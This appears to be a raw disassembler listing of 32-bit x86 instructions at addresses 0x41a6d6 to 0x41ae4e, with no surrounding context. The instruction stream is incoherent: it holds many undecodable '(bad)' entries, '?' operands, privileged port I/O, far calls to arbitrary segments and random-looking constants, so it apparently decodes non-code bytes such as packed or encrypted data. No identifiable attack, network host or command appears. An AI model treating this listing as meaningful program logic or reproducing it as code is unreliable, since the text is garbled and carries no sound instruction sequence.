  41a6d6:	mov    ebx,DWORD PTR [edx+0x56f05859]
  41a6dc:	ins    DWORD PTR es:[edi],dx
  41a6dd:	iret   
  41a6de:	mov    esp,0xbfaf1bdb
  41a6e3:	inc    ebp
  41a6e4:	push   0xddec5e7a
  41a6e9:	cmp    eax,0x5f12bd66
  41a6ee:	test   DWORD PTR [eax],esi
  41a6f0:	xor    DWORD PTR [ebp+ecx*8+0x72],esp
  41a6f4:	pop    edx
  41a6f5:	mov    ch,0x5a
  41a6f7:	lea    esp,[ebp+eiz*8-0x45]
  41a6fb:	xor    DWORD PTR [eax],ecx
  41a6fd:	test   al,0x5e
  41a6ff:	pushf  
  41a700:	pop    edi
  41a701:	inc    edx
  41a702:	addr16 cld 
  41a704:	fsqrt  
  41a706:	nop
  41a707:	rol    BYTE PTR [edi],1
  41a709:	mov    edx,0x6af87061
  41a70e:	mov    ?,WORD PTR [ebp-0x23b8c03d]
  41a714:	ret    
  41a715:	jp     0x41a6c5
  41a717:	cmp    ebx,DWORD PTR [ebp-0x5d]
  41a71a:	call   0x4bee:0xab4cfda7
  41a721:	mov    ds:0x1b02e29f,al
  41a726:	jno    0x41a71a
  41a728:	mov    ebp,0x5d906cef
  41a72d:	adc    ebp,ebx
  41a72f:	retf   0x33a9
  41a732:	fmul   DWORD PTR [esi-0x78]
  41a735:	and    dh,ah
  41a737:	xchg   edx,eax
  41a738:	std    
  41a739:	loop   0x41a777
  41a73b:	dec    edx
  41a73c:	jne    0x41a78d
  41a73e:	push   es
  41a73f:	les    eax,FWORD PTR [esp+ebx*4]
  41a742:	(bad)  
  41a744:	in     eax,0x53
  41a746:	rol    DWORD PTR [esi+0x5d],cl
  41a749:	aam    0xcd
  41a74b:	mov    al,ds:0x905f8734
  41a750:	loopne 0x41a762
  41a752:	call   0x5dd0:0xa44e9a65
  41a759:	inc    ebx
  41a75a:	sub    BYTE PTR [ecx+0x71ee1b4e],bl
  41a760:	sbb    DWORD PTR [edi],eax
  41a762:	and    BYTE PTR [edx-0x4ea4cd08],cl
  41a768:	dec    ebp
  41a769:	outs   dx,DWORD PTR ds:[esi]
  41a76a:	int    0x6c
  41a76c:	push   0x1
  41a76e:	add    cl,BYTE PTR [edi-0x73cb01c5]
  41a774:	sub    al,0x42
  41a776:	xchg   ecx,eax
  41a777:	outs   dx,BYTE PTR ds:[esi]
  41a778:	sbb    ch,cl
  41a77a:	test   edx,ebx
  41a77c:	loopne 0x41a771
  41a77e:	add    edi,eax
  41a780:	mov    ch,0xc3
  41a782:	daa    
  41a783:	or     al,0x93
  41a785:	bound  esp,QWORD PTR [edx+0x30]
  41a788:	data16 out 0x27,al
  41a78b:	cs adc eax,0x3327d53f
  41a791:	(bad)  
  41a793:	sbb    DWORD PTR [esp+ebp*4+0x73796734],0xfffffffe
  41a79b:	xchg   esi,eax
  41a79c:	repnz mov bl,0xf7
  41a79f:	fsubr  DWORD PTR [edi+0x5bb3f78]
  41a7a5:	xchg   esi,eax
  41a7a6:	xor    al,al
  41a7a8:	sbb    eax,0xe9d16f0b
  41a7ad:	jp     0x41a78f
  41a7af:	xchg   esp,ecx
  41a7b1:	pop    ecx
  41a7b2:	nop
  41a7b3:	and    BYTE PTR [edi],cl
  41a7b5:	fcomp  QWORD PTR [esi-0x70]
  41a7b8:	pop    edx
  41a7b9:	or     ch,BYTE PTR [eax-0x25]
  41a7bc:	add    al,0xae
  41a7be:	(bad)  
  41a7bf:	sub    DWORD PTR ds:[ebx+0x519993b1],esp
  41a7c6:	xor    BYTE PTR [esi],bl
  41a7c8:	sub    DWORD PTR es:[edx+0x4d75d4b4],ebp
  41a7cf:	clc    
  41a7d0:	mov    esp,0x18dc15b8
  41a7d5:	std    
  41a7d6:	adc    eax,0xfa257827
  41a7db:	add    bl,BYTE PTR [ebx-0x605a5900]
  41a7e1:	add    ecx,DWORD PTR [edx+edx*1+0x2dddf46]
  41a7e8:	lahf   
  41a7e9:	dec    esi
  41a7ea:	es xchg esp,eax
  41a7ec:	or     al,0x9
  41a7ee:	mov    edi,0x79ade4e6
  41a7f3:	popf   
  41a7f4:	adc    DWORD PTR [edi-0x3e],0xfffffffa
  41a7f8:	addr16 int3 
  41a7fa:	mov    al,0x8b
  41a7fc:	and    DWORD PTR [eax-0x7f],ebx
  41a7ff:	xchg   edi,eax
  41a800:	dec    esp
  41a801:	inc    eax
  41a802:	jno    0x41a78e
  41a804:	daa    
  41a805:	dec    ebx
  41a806:	jne    0x41a82c
  41a808:	cmp    DWORD PTR [ebx+0x3d2a0377],ecx
  41a80e:	loopne 0x41a7eb
  41a810:	stos   BYTE PTR es:[edi],al
  41a811:	mov    ebx,0x54eaf27e
  41a816:	jns    0x41a87a
  41a818:	icebp  
  41a819:	inc    edx
  41a81a:	les    ecx,FWORD PTR [ecx-0x1bf0636b]
  41a820:	mov    cs,edx
  41a822:	pop    ebx
  41a823:	das    
  41a824:	push   0x28638613
  41a829:	les    esi,FWORD PTR cs:[eax-0x581589c8]
  41a830:	jbe    0x41a7fc
  41a832:	sbb    eax,0x2b53afe7
  41a837:	inc    bx
  41a839:	aas    
  41a83a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a83b:	dec    eax
  41a83c:	fxch   st(2)
  41a83e:	or     BYTE PTR [eax],al
  41a840:	repnz cmp al,0x18
  41a843:	cs (bad) 
  41a845:	popf   
  41a846:	jne    0x41a862
  41a848:	retf   0x7414
  41a84b:	retf   
  41a84c:	pop    eax
  41a84d:	les    edx,FWORD PTR [edi]
  41a84f:	adc    al,0x1b
  41a851:	or     BYTE PTR [bp-0x5f],dh
  41a855:	mov    edi,DWORD PTR [edi]
  41a857:	push   cs
  41a858:	push   eax
  41a859:	adc    DWORD PTR [edi-0x51177b2b],esi
  41a85f:	arpl   WORD PTR [ebx],ax
  41a861:	fstp   DWORD PTR [ebp-0x4fb3ffca]
  41a867:	xor    DWORD PTR ds:0x7076fe92,ebp
  41a86d:	or     dh,BYTE PTR [esi-0x22663f12]
  41a873:	jo     0x41a8bf
  41a875:	push   0x72
  41a877:	test   eax,0xd59e35d2
  41a87c:	ss mov edi,0xedb1c2d4
  41a882:	jbe    0x41a835
  41a884:	pop    ds
  41a885:	ins    DWORD PTR es:[edi],dx
  41a886:	cwde   
  41a887:	clc    
  41a888:	inc    esi
  41a889:	int    0xaf
  41a88b:	mov    WORD PTR [edi],?
  41a88d:	adc    al,0xf9
  41a88f:	es lahf 
  41a891:	sbb    ah,ch
  41a893:	xor    bh,BYTE PTR [ebx]
  41a895:	sub    eax,0xf8dbc863
  41a89a:	xchg   ebx,eax
  41a89b:	mov    edi,0xbc386ae
  41a8a0:	pusha  
  41a8a1:	pop    esi
  41a8a2:	push   ebx
  41a8a3:	ret    
  41a8a4:	push   ss
  41a8a5:	enter  0xb2c0,0xb7
  41a8a9:	clc    
  41a8aa:	dec    ebx
  41a8ab:	dec    ebx
  41a8ac:	mov    ebp,0x453ba787
  41a8b1:	repnz adc eax,0x348f9af
  41a8b7:	mov    edi,DWORD PTR [ecx+ecx*1]
  41a8ba:	mov    esi,DWORD PTR [edx-0x33a835c4]
  41a8c0:	popa   
  41a8c1:	cmp    eax,0x50e43da4
  41a8c6:	test   esi,edi
  41a8c8:	addr16 cmp edx,edx
  41a8cb:	pop    esp
  41a8cc:	out    dx,al
  41a8cd:	leave  
  41a8ce:	mov    al,0x7c
  41a8d0:	cmp    eax,0x822f402e
  41a8d5:	mov    eax,ds:0x2d3a77f5
  41a8da:	ret    0x1c51
  41a8dd:	mov    eax,0x63913198
  41a8e2:	jb     0x41a8e5
  41a8e4:	lock cwde 
  41a8e6:	and    DWORD PTR [edx+0x15],esp
  41a8e9:	inc    eax
  41a8ea:	stos   BYTE PTR es:[edi],al
  41a8eb:	stc    
  41a8ec:	and    bh,dh
  41a8ee:	(bad)  
  41a8ef:	jecxz  0x41a878
  41a8f1:	sbb    ecx,DWORD PTR [ebx+0x6d3ab2a7]
  41a8f7:	xor    eax,0x20438196
  41a8fc:	pop    ecx
  41a8fd:	mov    ds:0xfcc6f3a4,al
  41a902:	xchg   ebx,eax
  41a903:	mov    esi,0xda497a80
  41a908:	push   0xbd1994cf
  41a90d:	push   0x1a
  41a90f:	sub    eax,0x3590bc50
  41a914:	jg     0x41a8c1
  41a916:	xchg   edi,eax
  41a917:	addr16 pop esi
  41a919:	xchg   ebp,eax
  41a91a:	cmp    al,0x4b
  41a91c:	mov    edi,0x35def811
  41a921:	cmp    eax,0x993e48e2
  41a926:	push   esi
  41a927:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a928:	mov    ch,0x8c
  41a92a:	mov    dl,0xaf
  41a92c:	xchg   esp,eax
  41a92d:	addr16 push edi
  41a92f:	jne    0x41a94e
  41a931:	mov    ebx,DWORD PTR [eax-0x5b]
  41a934:	test   eax,0x70063ca
  41a939:	loop   0x41a915
  41a93b:	fisubr WORD PTR [edx-0x67]
  41a93e:	test   al,0xff
  41a940:	inc    esi
  41a941:	jg     0x41a94f
  41a943:	pop    ecx
  41a944:	mov    ebp,0x4d47f657
  41a949:	enter  0x203e,0xaa
  41a94d:	mov    edi,0x2559ad52
  41a952:	xchg   ebx,eax
  41a953:	jmp    0xb1194e4
  41a958:	les    esi,FWORD PTR [edx-0x53e6fbfd]
  41a95e:	test   eax,0x73332c4a
  41a963:	hlt    
  41a964:	pop    esp
  41a965:	enter  0xb204,0x6c
  41a969:	fisttp DWORD PTR [esi]
  41a96b:	sahf   
  41a96c:	lahf   
  41a96d:	icebp  
  41a96e:	fwait
  41a96f:	mov    si,0xcca2
  41a973:	and    eax,0x7013a340
  41a978:	cmc    
  41a979:	loope  0x41a964
  41a97b:	arpl   WORD PTR [ecx+0x38],bx
  41a97e:	xchg   ecx,eax
  41a97f:	ja     0x41a959
  41a981:	aad    0x5e
  41a983:	dec    ebp
  41a984:	adc    ch,BYTE PTR [esi]
  41a986:	lea    edx,[edi]
  41a988:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a989:	or     edi,DWORD PTR [edx-0x7f0c7359]
  41a98f:	pop    esi
  41a990:	and    al,0x0
  41a992:	sahf   
  41a993:	sbb    BYTE PTR [edx+0x19],al
  41a996:	in     al,dx
  41a997:	(bad)  [ecx-0x3b]
  41a99a:	pop    esi
  41a99b:	les    ebx,FWORD PTR [eax+0x69509845]
  41a9a1:	xor    ebp,DWORD PTR [eax-0x3b]
  41a9a4:	mul    ebp
  41a9a6:	inc    ebx
  41a9a7:	dec    esp
  41a9a8:	sbb    al,0x3d
  41a9aa:	daa    
  41a9ab:	stos   BYTE PTR es:[edi],al
  41a9ac:	aas    
  41a9ad:	cwde   
  41a9ae:	and    bl,BYTE PTR [edx-0x7fbed09b]
  41a9b4:	push   edx
  41a9b5:	add    BYTE PTR [ecx+0x1cf24f68],dh
  41a9bb:	or     al,BYTE PTR [eax-0x46fa07b7]
  41a9c1:	shl    DWORD PTR [edi],cl
  41a9c3:	je     0x41a9e4
  41a9c5:	push   esi
  41a9c6:	sbb    BYTE PTR [edx],cl
  41a9c8:	outs   dx,BYTE PTR ds:[esi]
  41a9c9:	(bad)  
  41a9cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9cc:	leave  
  41a9cd:	pop    esp
  41a9ce:	scas   al,BYTE PTR es:[edi]
  41a9cf:	pop    es
  41a9d0:	pop    esp
  41a9d1:	and    al,0x58
  41a9d3:	pop    ebp
  41a9d4:	dec    ebx
  41a9d5:	div    BYTE PTR [edi]
  41a9d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9d8:	and    eax,0x95f9a443
  41a9dd:	pop    ss
  41a9de:	neg    DWORD PTR [esi+0x69f8e881]
  41a9e4:	mov    al,0x50
  41a9e6:	ret    0xec26
  41a9e9:	dec    edx
  41a9ea:	xchg   edx,eax
  41a9eb:	aaa    
  41a9ec:	ret    
  41a9ed:	mov    ds:0x5e126979,eax
  41a9f2:	push   ds
  41a9f3:	(bad)  
  41a9f5:	sti    
  41a9f6:	push   ebx
  41a9f7:	sbb    ch,BYTE PTR [ebx]
  41a9f9:	ret    
  41a9fa:	or     BYTE PTR [esi+0x55],dh
  41a9fd:	adc    eax,DWORD PTR [ecx]
  41a9ff:	jne    0x41aa57
  41aa01:	mov    esi,0x25d3bab7
  41aa06:	lods   al,BYTE PTR ds:[esi]
  41aa07:	jae    0x41aa60
  41aa09:	adc    BYTE PTR [ecx],dl
  41aa0b:	inc    esp
  41aa0c:	std    
  41aa0d:	mov    cl,0x41
  41aa0f:	xor    al,0x56
  41aa11:	xchg   edx,eax
  41aa12:	sub    eax,0x6f462f53
  41aa17:	xor    DWORD PTR [ebx],esp
  41aa19:	ret    
  41aa1a:	sbb    al,0xf0
  41aa1c:	jg     0x41aa07
  41aa1e:	xchg   DWORD PTR [eax-0x1b],ecx
  41aa21:	pop    DWORD PTR [edi]
  41aa23:	repnz out dx,al
  41aa25:	or     eax,0x545a51b5
  41aa2a:	adc    DWORD PTR [edx+0x553115ad],ecx
  41aa30:	mov    ch,0xd
  41aa32:	out    dx,eax
  41aa33:	or     edx,DWORD PTR [ecx+0x302d6177]
  41aa39:	push   ss
  41aa3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa3b:	push   es
  41aa3c:	ja     0x41aa97
  41aa3e:	aad    0xd2
  41aa40:	int3   
  41aa41:	lods   al,BYTE PTR ds:[esi]
  41aa42:	lods   eax,DWORD PTR ds:[esi]
  41aa43:	mov    DWORD PTR [edi-0x707a56f0],esp
  41aa49:	std    
  41aa4a:	call   0x7519d1eb
  41aa4f:	gs das 
  41aa51:	cmp    BYTE PTR [ecx+0x57],ah
  41aa54:	push   edx
  41aa55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa56:	or     cl,BYTE PTR [ecx-0xa]
  41aa59:	pop    esp
  41aa5a:	dec    edx
  41aa5b:	aaa    
  41aa5c:	push   edi
  41aa5d:	mov    ds:0xa9e0c900,eax
  41aa62:	call   0xe48d1a6a
  41aa67:	pop    esi
  41aa68:	inc    ebp
  41aa69:	xchg   edi,eax
  41aa6a:	mov    esi,0x28be7b35
  41aa6f:	mov    ds:0xd01447a8,eax
  41aa74:	inc    ebx
  41aa75:	test   eax,0xab29fb7c
  41aa7a:	loop   0x41aa32
  41aa7c:	sub    DWORD PTR [esi-0x6b],edx
  41aa7f:	retf   0xc96b
  41aa82:	popfw  
  41aa84:	mov    BYTE PTR [esp+eiz*4-0x4fdf5f44],cl
  41aa8b:	mov    ah,ah
  41aa8d:	pmulhw mm6,QWORD PTR [ebx-0x30d37ccb]
  41aa94:	scas   al,BYTE PTR es:[edi]
  41aa95:	pop    ecx
  41aa96:	arpl   WORD PTR [edx+0x326ce5a8],dx
  41aa9c:	es aaa 
  41aa9e:	imul   edx,DWORD PTR [edx-0x78],0xacd2e77f
  41aaa5:	jmp    0x6d124e94
  41aaaa:	or     eax,0xe5974d00
  41aaaf:	cmpxchg ch,cl
  41aab2:	xchg   esp,eax
  41aab3:	jnp    0x41aa8d
  41aab5:	and    dl,BYTE PTR [ecx+0x74]
  41aab8:	(bad)  
  41aab9:	popa   
  41aaba:	add    esi,esp
  41aabc:	sub    eax,0x7fd2ead2
  41aac1:	in     eax,0xdf
  41aac3:	add    al,0x12
  41aac5:	enter  0x90c8,0x9e
  41aac9:	jp     0x41ab42
  41aacb:	cwde   
  41aacc:	xchg   ebp,eax
  41aacd:	pop    ecx
  41aace:	lock pop edx
  41aad0:	dec    edi
  41aad1:	mov    cl,0x6e
  41aad3:	out    dx,eax
  41aad4:	mov    bl,0xd
  41aad6:	shr    DWORD PTR [ebx+eiz*4],1
  41aad9:	sbb    al,0x8f
  41aadb:	adc    eax,0xab5376cd
  41aae0:	mov    dl,0x12
  41aae2:	or     ebp,DWORD PTR [eax-0x67]
  41aae5:	sbb    DWORD PTR [edi+0x345ca8a8],edi
  41aaeb:	mov    esi,0xbf84e79
  41aaf0:	inc    edi
  41aaf1:	mov    esp,0xf7063832
  41aaf6:	xchg   edx,eax
  41aaf7:	std    
  41aaf8:	mov    ebx,0x1823fd15
  41aafd:	ds inc esp
  41aaff:	scas   eax,DWORD PTR es:[edi]
  41ab00:	inc    ebx
  41ab01:	aas    
  41ab02:	and    BYTE PTR [ecx-0x29],dh
  41ab05:	bound  ebx,QWORD PTR [ecx]
  41ab07:	or     edi,DWORD PTR [edx+0x71]
  41ab0a:	push   ss
  41ab0b:	adc    BYTE PTR [esi],ch
  41ab0d:	fisttp QWORD PTR [edi]
  41ab0f:	adc    BYTE PTR [ebx],0xb0
  41ab12:	sub    eax,0x6e517c6a
  41ab17:	loope  0x41ab7e
  41ab19:	cmp    al,0xa
  41ab1b:	lods   al,BYTE PTR ds:[esi]
  41ab1c:	addr16 dec eax
  41ab1e:	(bad)  
  41ab1f:	data16 ja 0x41ab3a
  41ab22:	sub    DWORD PTR [edx-0x14f16c03],esp
  41ab28:	sahf   
  41ab29:	repz dec eax
  41ab2b:	call   0xca92:0x4ca16bdf
  41ab32:	arpl   WORD PTR [edx+0x6ffa024b],di
  41ab38:	cmp    eax,0x27605137
  41ab3d:	push   0x66
  41ab3f:	imul   edi,DWORD PTR [ecx+0x49],0x67
  41ab43:	(bad)  
  41ab45:	dec    esi
  41ab46:	sub    esi,edx
  41ab48:	mov    eax,0x32cc76a5
  41ab4d:	jnp    0x41aae5
  41ab4f:	jmp    0xce85:0xda07c287
  41ab56:	sbb    BYTE PTR [edx+0x4977cea0],cl
  41ab5c:	sbb    edi,ecx
  41ab5e:	cld    
  41ab5f:	mov    ds:0x2c43499f,eax
  41ab64:	fmul   QWORD PTR [eax+ebp*4]
  41ab67:	push   ss
  41ab68:	aad    0xcc
  41ab6a:	xchg   esp,eax
  41ab6b:	cdq    
  41ab6c:	dec    esi
  41ab6d:	fucomp st(4)
  41ab6f:	lods   eax,DWORD PTR ds:[esi]
  41ab70:	repnz or esp,DWORD PTR ds:0xcacb4682
  41ab77:	stos   BYTE PTR es:[edi],al
  41ab78:	stos   DWORD PTR es:[edi],eax
  41ab79:	jl     0x41abea
  41ab7b:	cs cdq 
  41ab7d:	lods   eax,DWORD PTR ds:[esi]
  41ab7e:	ds push ebx
  41ab80:	les    esi,FWORD PTR [ecx+0x32]
  41ab83:	les    ebp,FWORD PTR [edi-0x39]
  41ab86:	pop    ebp
  41ab87:	mov    ebx,0xea5a8156
  41ab8c:	call   FWORD PTR [esi-0x194f8be6]
  41ab92:	and    al,0xaa
  41ab94:	mov    edi,0x482d806f
  41ab99:	and    ebp,DWORD PTR [ebp-0x38]
  41ab9c:	les    eax,FWORD PTR [edx+0x7745127]
  41aba2:	arpl   WORD PTR [ebp+0x2d],sp
  41aba5:	(bad)  
  41aba6:	mov    eax,ds:0xf6678941
  41abab:	fld    st(1)
  41abad:	retfw  
  41abaf:	sbb    al,0xde
  41abb1:	or     ah,bh
  41abb3:	lock loopne 0x41ab44
  41abb6:	pop    ds
  41abb7:	adc    DWORD PTR [eax],esp
  41abb9:	inc    ebp
  41abba:	mov    ebp,0x8e8c0d4c
  41abbf:	mov    bh,0xcd
  41abc1:	and    al,0xd3
  41abc3:	cld    
  41abc4:	ret    0xd688
  41abc7:	and    DWORD PTR [edx],0x5
  41abca:	mov    ds:0xbed179d6,eax
  41abcf:	jle    0x41abb6
  41abd1:	jmp    0x46e4db78
  41abd6:	in     al,dx
  41abd7:	xor    eax,0xe0788aad
  41abdc:	dec    ecx
  41abdd:	inc    ebp
  41abdf:	shr    ebp,1
  41abe1:	pushf  
  41abe2:	mov    dl,0x2f
  41abe4:	mov    ?,WORD PTR [eax-0xe]
  41abe7:	sbb    al,BYTE PTR [edx+0x257a67de]
  41abed:	sti    
  41abee:	jns    0x41ac22
  41abf0:	push   edx
  41abf1:	and    BYTE PTR [ecx+0x40],0xcf
  41abf5:	pop    ebp
  41abf6:	pop    esp
  41abf7:	pop    ecx
  41abf8:	ins    BYTE PTR es:[edi],dx
  41abf9:	cli    
  41abfa:	sbb    ebx,DWORD PTR [ebx-0x7f3c6202]
  41ac00:	pop    eax
  41ac01:	push   0x63
  41ac03:	cmp    esp,DWORD PTR [esi+0x36]
  41ac06:	push   ebp
  41ac07:	cmp    eax,0xa8aad547
  41ac0c:	gs mov eax,0x6cee75fa
  41ac12:	es ss and eax,0xffa2f98
  41ac19:	jne    0x41abf9
  41ac1b:	sbb    ah,bh
  41ac1d:	cmc    
  41ac1e:	enter  0x9fd2,0x33
  41ac22:	adc    al,0xbd
  41ac24:	add    BYTE PTR [edx-0x74d9384c],0x53
  41ac2b:	cmp    ah,BYTE PTR [ebp-0x4d]
  41ac2e:	mov    dh,0x92
  41ac30:	ret    
  41ac31:	or     DWORD PTR [esi+edx*8-0x33],0x70093eaf
  41ac39:	mov    ds:0xb639305b,eax
  41ac3e:	and    DWORD PTR [esi+ebp*1+0x30],edi
  41ac42:	dec    eax
  41ac43:	or     eax,0x26ee9f72
  41ac48:	addr16 iret 
  41ac4a:	mov    ecx,0x5d695e47
  41ac4f:	cmp    BYTE PTR [ecx-0x34],bh
  41ac52:	add    DWORD PTR [esi],ecx
  41ac54:	adc    BYTE PTR [esp+eax*2],bl
  41ac57:	xchg   ecx,eax
  41ac58:	jno    0x41abe5
  41ac5a:	mov    bl,bh
  41ac5c:	push   esp
  41ac5d:	xor    ch,BYTE PTR [edi+eax*1+0x57]
  41ac61:	push   ss
  41ac62:	push   ds
  41ac63:	dec    ebx
  41ac64:	(bad)  [edi]
  41ac66:	scas   eax,DWORD PTR es:[edi]
  41ac67:	shl    DWORD PTR [edx+0x9cd72f7],cl
  41ac6d:	into   
  41ac6e:	scas   eax,DWORD PTR es:[edi]
  41ac6f:	xchg   ebx,eax
  41ac70:	push   eax
  41ac71:	mov    al,BYTE PTR [esi]
  41ac73:	push   0x3e404242
  41ac78:	xchg   ecx,eax
  41ac79:	ins    DWORD PTR es:[edi],dx
  41ac7a:	xchg   edi,eax
  41ac7b:	add    al,0xb5
  41ac7d:	dec    ebp
  41ac7e:	xchg   edx,eax
  41ac7f:	sub    cl,BYTE PTR [esi+ecx*2+0xe]
  41ac83:	enterw 0x4f9e,0x3f
  41ac88:	test   BYTE PTR [esi],dl
  41ac8a:	push   ebp
  41ac8b:	lock fbstp TBYTE PTR [edx-0x4db2d9ba]
  41ac92:	pop    ds
  41ac93:	outs   dx,DWORD PTR ds:[esi]
  41ac94:	stos   BYTE PTR es:[edi],al
  41ac95:	xchg   ecx,eax
  41ac96:	retf   
  41ac97:	jae    0x41acf9
  41ac99:	mov    al,0xb2
  41ac9b:	cmc    
  41ac9c:	lock push es
  41ac9e:	aas    
  41ac9f:	fisttp WORD PTR [ebp-0x5b]
  41aca2:	out    dx,al
  41aca3:	lods   eax,DWORD PTR ds:[esi]
  41aca4:	in     al,0xfe
  41aca6:	mov    bl,0x3b
  41aca8:	cmp    ch,ch
  41acaa:	xchg   edx,eax
  41acab:	ins    BYTE PTR es:[edi],dx
  41acac:	int3   
  41acad:	inc    edi
  41acae:	jmp    0x6db3eae
  41acb3:	sbb    eax,0xdf8ab8c0
  41acb8:	mov    ebp,0x60e8d84c
  41acbd:	out    dx,eax
  41acbe:	out    0xc4,eax
  41acc0:	sbb    eax,0x63bf68aa
  41acc5:	out    dx,al
  41acc6:	test   al,0xca
  41acc8:	in     eax,0x5
  41acca:	ret    0x9ccb
  41accd:	call   0x131219e5
  41acd2:	push   ds
  41acd3:	int3   
  41acd4:	or     DWORD PTR [ebx],esi
  41acd6:	xchg   edi,eax
  41acd7:	fistp  QWORD PTR [edi-0x4985650d]
  41acdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acde:	sbb    BYTE PTR [esi-0x67],dl
  41ace1:	pop    esi
  41ace2:	push   0xffffffd0
  41ace4:	pop    ds
  41ace5:	enter  0xa125,0x71
  41ace9:	shl    BYTE PTR [edx],1
  41aceb:	push   esp
  41acec:	pusha  
  41aced:	(bad)  
  41acee:	fst    QWORD PTR [ebx]
  41acf0:	add    ebp,DWORD PTR [ebx]
  41acf2:	jnp    0x41ac9d
  41acf4:	fcomp  QWORD PTR [edi]
  41acf6:	sti    
  41acf7:	sub    al,0xf
  41acf9:	inc    esi
  41acfa:	rcl    ah,cl
  41acfc:	inc    ebp
  41acfd:	mov    dh,0x2d
  41acff:	or     eax,DWORD PTR [edx+0x51]
  41ad02:	or     BYTE PTR [ecx+ecx*4],dl
  41ad05:	push   ebx
  41ad06:	(bad)  
  41ad08:	stos   DWORD PTR es:[edi],eax
  41ad09:	inc    ecx
  41ad0a:	and    esi,DWORD PTR [ecx]
  41ad0c:	popf   
  41ad0d:	pushf  
  41ad0e:	scas   al,BYTE PTR es:[edi]
  41ad0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad10:	aad    0x7d
  41ad12:	fwait
  41ad13:	popf   
  41ad14:	xchg   edi,eax
  41ad15:	add    eax,0x61f3263d
  41ad1a:	std    
  41ad1b:	push   esp
  41ad1c:	mov    ah,0x48
  41ad1e:	jl     0x41acc6
  41ad20:	int3   
  41ad21:	(bad)
  41ad24:	sbb    ebx,0xe686f359
  41ad2a:	mov    al,0x4d
  41ad2c:	push   ecx
  41ad2d:	out    dx,al
  41ad2e:	loop   0x41ad7f
  41ad30:	sbb    dh,bl
  41ad32:	ret    0xe90a
  41ad35:	lahf   
  41ad36:	test   DWORD PTR ds:0xa417a866,eax
  41ad3c:	test   cl,0xa9
  41ad3f:	stc    
  41ad40:	mov    dl,0x3f
  41ad42:	js     0x41adbb
  41ad44:	das    
  41ad45:	arpl   dx,ax
  41ad47:	test   BYTE PTR [ebx-0x6d0ec4b],ch
  41ad4d:	pop    ebp
  41ad4e:	(bad)  
  41ad4f:	or     BYTE PTR [edx-0x44c13da6],dl
  41ad55:	es (bad) 
  41ad57:	loope  0x41ad3a
  41ad59:	repnz xor BYTE PTR [eax-0x7b6bed33],ch
  41ad60:	mul    DWORD PTR [edx]
  41ad62:	fwait
  41ad63:	aam    0x25
  41ad65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad66:	mov    ds,WORD PTR [esi+ebx*1-0x6df95041]
  41ad6d:	mov    esi,ds
  41ad6f:	mov    bh,0x81
  41ad71:	out    0xe4,eax
  41ad73:	mov    bh,0x60
  41ad75:	mov    eax,ds:0x6979b7da
  41ad7a:	mov    eax,0xb9eb0d02
  41ad7f:	aas    
  41ad80:	jae    0x41adf8
  41ad82:	std    
  41ad83:	cmp    eax,DWORD PTR [eax+0x6e305dae]
  41ad89:	or     esp,eax
  41ad8b:	dec    esi
  41ad8c:	mov    bl,0xd4
  41ad8e:	push   ss
  41ad8f:	test   DWORD PTR [edx+0xcd53b58],0x375fd519
  41ad99:	jecxz  0x41ad21
  41ad9b:	rdtsc  
  41ad9d:	mov    bh,0xd6
  41ad9f:	jne    0x41ad7c
  41ada1:	adc    bl,BYTE PTR [eax+0x1baaf980]
  41ada7:	mov    DWORD PTR [eax+ebx*2-0x45],esp
  41adab:	mov    edx,0x7e785781
  41adb0:	addr16 xchg ecx,edi
  41adb3:	add    eax,0x72bf9486
  41adb8:	xor    al,0xba
  41adba:	test   eax,0x6e1aa53a
  41adbf:	jb     0x41ae21
  41adc1:	test   ebp,esp
  41adc3:	mov    DWORD PTR [esi],edx
  41adc5:	fcomi  st,st(3)
  41adc7:	stos   BYTE PTR es:[edi],al
  41adc8:	jns    0x41adfd
  41adca:	push   0xdf298a25
  41adcf:	shl    BYTE PTR [ebx],1
  41add1:	jmp    0x8041:0x8d40a3c
  41add8:	ja     0x41adf7
  41adda:	idiv   BYTE PTR [eax-0x1ead1973]
  41ade0:	xchg   edi,eax
  41ade1:	pop    ecx
  41ade2:	cld    
  41ade3:	(bad)  
  41ade4:	lods   eax,DWORD PTR ds:[esi]
  41ade5:	cwde   
  41ade6:	or     BYTE PTR [ecx],dh
  41ade8:	test   eax,0x855672bf
  41aded:	sbb    al,0x39
  41adef:	in     al,0xb5
  41adf1:	xchg   ebp,eax
  41adf2:	test   BYTE PTR ds:0xe0470a71,dl
  41adf8:	js     0x41ae00
  41adfa:	sub    bh,ah
  41adfc:	mov    bh,0xe7
  41adfe:	arpl   WORD PTR [ebx],dx
  41ae00:	loopne 0x41adc1
  41ae02:	mov    bh,0x17
  41ae04:	push   edx
  41ae05:	pop    es
  41ae06:	push   ecx
  41ae07:	mov    ds:0x8e6b0ca4,eax
  41ae0c:	adc    esi,0x5
  41ae0f:	ds cs cld 
  41ae12:	xor    cl,dl
  41ae14:	out    0x8e,eax
  41ae16:	mov    ah,0x7e
  41ae18:	stos   DWORD PTR es:[edi],eax
  41ae19:	loope  0x41ae0d
  41ae1b:	push   es
  41ae1c:	pop    eax
  41ae1d:	test   BYTE PTR [edi-0x25],cl
  41ae20:	mov    eax,ds:0xc2fa18f
  41ae25:	je     0x41adbe
  41ae27:	xchg   DWORD PTR [eax],edx
  41ae29:	or     DWORD PTR [ecx+0x5c053dab],edi
  41ae2f:	clc    
  41ae30:	cwde   
  41ae31:	mov    ah,0xe5
  41ae33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae34:	mov    BYTE PTR [ebx+eax*2+0x2a],al
  41ae38:	popa   
  41ae39:	sbb    eax,0xa5aa12e6
  41ae3e:	scas   al,BYTE PTR es:[edi]
  41ae3f:	shl    BYTE PTR [edi],0x1d
  41ae42:	icebp  
  41ae43:	or     BYTE PTR [esi+0x7b],0x50
  41ae47:	push   eax
  41ae48:	mov    al,ds:0x5807d9ca
  41ae4d:	in     al,dx
  41ae4e:	sub    BYTE PTR ds:0x59cef54,bl
